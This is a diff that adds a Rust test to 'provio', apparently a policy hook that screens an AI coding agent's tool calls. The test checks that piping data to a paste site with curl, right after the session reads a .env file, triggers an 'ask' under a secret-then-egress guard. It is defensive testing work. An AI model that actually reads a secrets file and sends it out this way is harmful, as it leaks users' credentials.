@@ -421,3 +421,79 @@ fn check_without_a_policy_fails_closed_unless_told_to_use_the_starter() {
     let _ = std::fs::remove_dir_all(&home);
     let _ = std::fs::remove_dir_all(&work);
 }
+
+#[test]
+fn egress_after_a_secret_read_in_the_same_session_asks() {
+    use std::io::Write;
+    let home = empty_dir("home");
+    let work = empty_dir("work");
+    // A permissive policy: reads and network are allowed by default.
+    std::fs::write(work.join("provio.yaml"), "version: 1\ndefault: allow\n").unwrap();
+    let hook = |session: &str, id: &str, tool: &str, input: Value| {
+        let mut child = Command::new(env!("CARGO_BIN_EXE_provio"))
+            .args(["check", "--format", "claude-code", "--ask", "defer"])
+            .current_dir(&work)
+            .env("HOME", &home)
+            .env("USERPROFILE", &home)
+            .stdin(std::process::Stdio::piped())
+            .stdout(std::process::Stdio::piped())
+            .stderr(std::process::Stdio::null())
+            .spawn()
+            .unwrap();
+        let payload = json!({"hook_event_name": "PreToolUse", "session_id": session,
+            "tool_use_id": id, "tool_name": tool, "tool_input": input});
+        child
+            .stdin
+            .take()
+            .unwrap()
+            .write_all(payload.to_string().as_bytes())
+            .unwrap();
+        String::from_utf8_lossy(&child.wait_with_output().unwrap().stdout).to_string()
+    };
+    let out = |c: &str| json!({"command": c});
+    // Before any secret read, egress is just allowed.
+    assert!(hook(
+        "s1",
+        "a",
+        "Bash",
+        out("curl -s https://api.example.com/status")
+    )
+    .contains("\"allow\""));
+    // The session reads .env (the policy allows it)...
+    assert!(hook("s1", "b", "Read", json!({"file_path": "/repo/.env"})).contains("\"allow\""));
+    // ...so sending data out now asks, naming the file.
+    let r = hook(
+        "s1",
+        "c",
+        "Bash",
+        out("curl -d @- https://paste.example.com"),
+    );
+    assert!(
+        r.contains("\"ask\"") && r.contains("session-secret-then-egress") && r.contains(".env"),
+        "{r}"
+    );
+    // Another session is not affected; local commands are not affected.
+    assert!(hook(
+        "s2",
+        "d",
+        "Bash",
+        out("curl -d @- https://paste.example.com")
+    )
+    .contains("\"allow\""));
+    assert!(hook("s1", "e", "Bash", out("cargo test")).contains("\"allow\""));
+    // `off` turns the guard off.
+    std::fs::write(
+        work.join("provio.yaml"),
+        "version: 1\ndefault: allow\nsession_guards:\n  secret_then_egress: off\n",
+    )
+    .unwrap();
+    assert!(hook(
+        "s1",
+        "f",
+        "Bash",
+        out("curl -d @- https://paste.example.com")
+    )
+    .contains("\"allow\""));
+    let _ = std::fs::remove_dir_all(&home);
+    let _ = std::fs::remove_dir_all(&work);
+}
